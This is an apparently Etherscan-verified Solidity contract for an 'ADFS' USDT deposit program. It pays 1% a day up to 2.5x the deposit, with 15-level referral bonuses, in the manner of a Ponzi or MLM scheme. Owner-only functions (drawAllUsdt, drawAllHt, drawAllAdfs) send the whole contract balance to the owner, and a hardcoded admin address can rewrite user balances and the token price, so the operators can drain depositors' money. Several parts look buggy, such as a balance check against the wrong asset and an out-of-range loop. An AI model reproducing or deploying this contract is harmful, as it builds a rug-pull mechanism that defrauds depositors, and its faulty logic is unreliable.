/**
 *Submitted for verification at Etherscan.io on 2021-04-29
*/

pragma solidity 0.5.12;

interface ERC20 {
    function transfer(address receiver, uint amount) external;
    function transferFrom(address _from, address _to, uint256 _value) external;
    function balanceOf(address receiver)  external returns(uint256);
}

contract ADFS {
    struct User {
        uint256 cycle;
        address upline;
        uint256 referrals;
        uint256 payouts;
        uint256 direct_bonus;
        uint256 pool_bonus;
        uint256 match_bonus;
        uint256 deposit_amount;
        uint256 deposit_payouts;
        uint40 deposit_time;
        uint256 total_deposits;
        uint256 total_payouts;
        uint256 total_structure;
        uint256 adfsbalance;
    }

    address payable public owner;
    address payable public project_side1 = 0xd5f70A96D3A9ac84b58B9fd5C60a617344D35dB2;
    address payable public project_side2 = 0xD7b27CB012fE9Df9Aafe1BFd8C499bAa3339bfB0;
    address payable public project_side3 = 0xB467237230875d7765a8d1d34274cD0f340732AD;
    address payable public adfs_fund;

    mapping(address => User) public users;

    uint256[] public cycles = [5e9,1e10,3e10];
    uint8[] public ref_bonuses = [30,10,10,10,10,8,8,8,8,8,5,5,5,5,5];                     // 1 => 1%

    uint8[] public pool_bonuses = [40,25,20,10,5];                    // 1 => 1%
    uint40 public pool_last_draw = uint40(block.timestamp);
    uint256 public pool_cycle;
    uint256 public pool_balance;
    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
    mapping(uint8 => address) public pool_top;
    
    mapping(uint256 => bool) public adfssTotalLevelMap;

    uint256 public total_users = 1;
    uint256 public total_deposited;
    uint256 public total_withdraw;
	uint256 public totalAdfsBalance = 0;
	uint256 public luckDrawBase = 10;
	uint256 public adfsToUsdt = 1e6;//adfs-usdt
	uint256 public usdtToAdfsRate = 0;//usdt->adfs rate
	uint256 public adfsIssueBase = 1e10;
    uint256 public fundRate = 0;
    
    event Upline(address indexed addr, address indexed upline);
    event NewDeposit(address indexed addr, uint256 amount);
    event DirectPayout(address indexed addr, address indexed from, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event PoolPayout(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event LimitReached(address indexed addr, uint256 amount);
	
	ERC20 public usdtToken = ERC20(0x9a9b47AC408737Ec562c2BB1b73f9F169e953db6); 
	ERC20 public adfsToken = ERC20(0x4783D9726788Bd9A29a9d5788325Ce115cde7E94); 

    constructor(address payable _owner) public {
        owner = _owner;
    }

    function() payable external {
        _deposit(msg.sender, msg.value);
    }

    function _setUpline(address _addr, address _upline) private {
        if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && (users[_upline].deposit_time > 0 || _upline == owner)) {
            users[_addr].upline = _upline;
            users[_upline].referrals++;

            emit Upline(_addr, _upline);

            total_users++;

            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                if(_upline == address(0)) break;

                users[_upline].total_structure++;

                _upline = users[_upline].upline;
            }
        }
    }

    function _deposit(address _addr, uint256 _amount) private {
        require(users[_addr].upline != address(0) || _addr == owner, "No upline");

        if(users[_addr].deposit_time > 0) {
            users[_addr].cycle++;
            
            require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), "Deposit already exists");
            require(_amount >= users[_addr].deposit_amount && _amount <= cycles[users[_addr].cycle > cycles.length - 1 ? cycles.length - 1 : users[_addr].cycle], "Bad amount");
        }
        else require(_amount >= 1e8 && _amount <= cycles[0], "Bad amount");
		
		usdtToken.transferFrom(msg.sender,address(this),_amount); 
        
        users[_addr].payouts = 0;
        users[_addr].deposit_amount = _amount;
        users[_addr].deposit_payouts = 0;
        users[_addr].deposit_time = uint40(block.timestamp);
        users[_addr].total_deposits += _amount;

        total_deposited += _amount;
        
        emit NewDeposit(_addr, _amount);

        if(users[_addr].upline != address(0)) {
            users[users[_addr].upline].direct_bonus += _amount / 20;

            emit DirectPayout(users[_addr].upline, _addr, _amount / 20);
        }

        _pollDeposits(_addr, _amount);

        if(pool_last_draw + 1 days < block.timestamp) {
            _drawPool();
			
			adfsToUsdt = adfsToUsdt * 1005 /1000;
        }
		usdtToken.transfer(project_side1,_amount * 12 / 1000);
		usdtToken.transfer(project_side2,_amount * 12 / 1000);
		usdtToken.transfer(project_side3,_amount * 5 / 1000);
		
		if(fundRate > 0){
			adfs_fund.transfer(_amount * fundRate / 1000);
		}
		
		uint256 totalLevel = total_deposited / adfsIssueBase;
		
		if(totalLevel > 0 && adfssTotalLevelMap[totalLevel] != true){
			totalAdfsBalance = totalAdfsBalance + 5e8;
		}else{
			adfssTotalLevelMap[totalLevel] = true;
		}
        
    }

    function _pollDeposits(address _addr, uint256 _amount) private {
        pool_balance += _amount * 3 / 100;

        address upline = users[_addr].upline;

        if(upline == address(0)) return;
        
        pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == upline) break;

            if(pool_top[i] == address(0)) {
                pool_top[i] = upline;
                break;
            }

            if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {
                for(uint8 j = i + 1; j < pool_bonuses.length; j++) {
                    if(pool_top[j] == upline) {
                        for(uint8 k = j; k <= pool_bonuses.length; k++) {
                            pool_top[k] = pool_top[k + 1];
                        }
                        break;
                    }
                }

                for(uint8 j = uint8(pool_bonuses.length - 1); j > i; j--) {
                    pool_top[j] = pool_top[j - 1];
                }

                pool_top[i] = upline;

                break;
            }
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = users[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            if(users[up].referrals >= i + 1) {
                uint256 bonus = _amount * ref_bonuses[i] / 100;
				
				(uint256 to_payout, uint256 max_payout) = this.payoutOf(up);
				// Match payout
				if(to_payout + users[up].payouts + users[up].direct_bonus + users[up].pool_bonus + users[up].match_bonus < max_payout) {
					if(to_payout + users[up].payouts + users[up].direct_bonus + users[up].pool_bonus + users[up].match_bonus + bonus > max_payout) {
						bonus = max_payout - to_payout - users[up].payouts - users[up].direct_bonus - users[up].pool_bonus - users[up].match_bonus;
					}
					
					users[up].match_bonus += bonus;
				}

                emit MatchPayout(up, _addr, bonus);
            }

            up = users[up].upline;
        }
    }

    function _drawPool() private {
        pool_last_draw = uint40(block.timestamp);
        pool_cycle++;

        uint256 draw_amount = pool_balance / 10;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            uint256 win = draw_amount * pool_bonuses[i] / 100;

            users[pool_top[i]].pool_bonus += win;
            pool_balance -= win;

            emit PoolPayout(pool_top[i], win);
        }
        
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            pool_top[i] = address(0);
        }
    }

    function deposit(address _upline,uint256 _amount) payable external {
        _setUpline(msg.sender, _upline);
        _deposit(msg.sender, _amount);
    }

    function withdraw() external {
        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);
        
        require(users[msg.sender].payouts < max_payout, "Full payouts");

        // Deposit payout
        if(to_payout > 0) {
            if(users[msg.sender].payouts + to_payout > max_payout) {
                to_payout = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].deposit_payouts += to_payout;
            users[msg.sender].payouts += to_payout;

            _refPayout(msg.sender, to_payout);
        }
        
        // Direct payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].direct_bonus > 0) {
            uint256 direct_bonus = users[msg.sender].direct_bonus;

            if(users[msg.sender].payouts + direct_bonus > max_payout) {
                direct_bonus =  max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].direct_bonus -= direct_bonus;
            users[msg.sender].payouts += direct_bonus;
            to_payout += direct_bonus;
        }
        
        // Pool payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].pool_bonus > 0) {
            uint256 pool_bonus = users[msg.sender].pool_bonus;

            if(users[msg.sender].payouts + pool_bonus > max_payout) {
                pool_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].pool_bonus -= pool_bonus;
            users[msg.sender].payouts += pool_bonus;
            to_payout += pool_bonus;
        }

        // Match payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].match_bonus > 0) {
            uint256 match_bonus = users[msg.sender].match_bonus;

            if(users[msg.sender].payouts + match_bonus > max_payout) {
                match_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].match_bonus -= match_bonus;
            users[msg.sender].payouts += match_bonus;
            to_payout += match_bonus;
        }

        require(to_payout > 0, "Zero payout");
        
        users[msg.sender].total_payouts += to_payout;
        total_withdraw += to_payout;

		usdtToken.transfer(msg.sender,to_payout); 

        emit Withdraw(msg.sender, to_payout);

        if(users[msg.sender].payouts >= max_payout) {
            emit LimitReached(msg.sender, users[msg.sender].payouts);
        }
    }
    
    function maxPayoutOf(uint256 _amount) pure external returns(uint256) {
        return _amount * 25 / 10;
    }

    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
        max_payout = this.maxPayoutOf(users[_addr].deposit_amount);

        if(users[_addr].payouts + users[_addr].direct_bonus + users[_addr].pool_bonus + users[_addr].match_bonus < max_payout) {
            payout = (users[_addr].deposit_amount * ((block.timestamp - users[_addr].deposit_time) / 1 days) / 100) - users[_addr].deposit_payouts;
            
            if(users[_addr].payouts + users[_addr].direct_bonus + users[_addr].pool_bonus + users[_addr].match_bonus + payout > max_payout) {
                payout = max_payout - users[_addr].payouts - users[_addr].direct_bonus - users[_addr].pool_bonus - users[_addr].match_bonus;
            }
        }
    }
    
	function withdrawAdfs(uint256 adfsAmount) external{
		require(adfsToken.balanceOf(address(this)) >= adfsAmount, "adfsBalance is not enough");
		require(users[msg.sender].adfsbalance >= adfsAmount, "user adfsBalance is not enough");
		
		users[msg.sender].adfsbalance = users[msg.sender].adfsbalance - adfsAmount;
		adfsToken.transfer(msg.sender,adfsAmount); 
	}
	
	/**
	* adfs -> usdt
	*/
	function exchangeUsdtByAdfs(uint256 adfsAmount) external{
		require(users[msg.sender].adfsbalance >= adfsAmount, "user adfsbalance is not enough");
		
		users[msg.sender].adfsbalance -= adfsAmount;
		totalAdfsBalance += adfsAmount;
		
		uint256 usdtAmount = adfsAmount * adfsToUsdt / 1e6 ;
		
		require(address(this).balance >= usdtAmount, "usdt is not enough");
		
		usdtToken.transfer(msg.sender,usdtAmount); 
	}
	
	/**
    * @dev set User AdfsBalance.
    */
    function setUserAdfsBalance(address _addr,uint256 _adfsbalance) external {
        require(msg.sender == owner || msg.sender == 0x553e157Aed731844A32a1861aD16b4acD660d0c8, "must be owner");
        users[_addr].adfsbalance = _adfsbalance;
    }
	
	/**
    * @dev set totalAdfsBalance.
    */
    function setTotalAdfsBalance(uint256 _totalAdfsBalance) external {
        require(msg.sender == owner || msg.sender == 0x553e157Aed731844A32a1861aD16b4acD660d0c8, "must be owner");
        totalAdfsBalance = _totalAdfsBalance;
    }
	
	/**
    * @dev set adfsToUsdt.
    */
    function setAdfsToUsdtPrice(uint256 _adfsToUsdt) external {
        require(msg.sender == owner || msg.sender == 0x553e157Aed731844A32a1861aD16b4acD660d0c8, "must be owner");
        adfsToUsdt = _adfsToUsdt;
    }
	
	/**
	* dev drawAllHT
	*/
	function drawAllHt() external{
        require(msg.sender == owner, "must be owner");
		owner.transfer(address(this).balance); 
	}
	
	/**
	* dev drawAllUsdt
	*/
	function drawAllUsdt() external{
        require(msg.sender == owner, "must be owner");
		usdtToken.transfer(owner,usdtToken.balanceOf(address(this))); 
	}
	
	/**
	* dev drawAllAdfs
	*/
	function drawAllAdfs() external{
        require(msg.sender == owner, "must be owner");
		adfsToken.transfer(owner,adfsToken.balanceOf(address(this)));
	}

    /*
        Only external call
    */
    function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus, uint256 pool_bonus, uint256 match_bonus) {
        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus, users[_addr].pool_bonus, users[_addr].match_bonus);
    }

    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure, uint256 adfs_balance) {
        return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure, users[_addr].adfsbalance);
    }

    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw, uint40 _pool_last_draw, uint256 _pool_balance, uint256 _pool_lider) {
        return (total_users, total_deposited, total_withdraw, pool_last_draw, pool_balance, pool_users_refs_deposits_sum[pool_cycle][pool_top[0]]);
    }

    function poolTopInfo() view external returns(address[5] memory addrs, uint256[5] memory deps) {
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            addrs[i] = pool_top[i];
            deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];
        }
    }
	
}